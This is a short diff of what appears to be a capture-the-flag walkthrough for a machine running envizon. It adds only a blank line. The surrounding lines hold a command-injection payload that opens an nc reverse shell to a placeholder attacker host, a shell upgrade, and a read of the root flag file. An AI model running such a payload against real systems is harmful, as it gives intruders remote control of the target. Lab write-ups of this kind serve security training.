@@ -35,6 +35,7 @@ sqlite3 envizon.db "SELECT * FROM settings;"
 
 # Payload injected into vulnerable note parameter to initiate callback
 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER_IP] [PORT] >/tmp/f
+
 # Upgrading shell and grabbing the final root flag
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 cat /root/root.txt
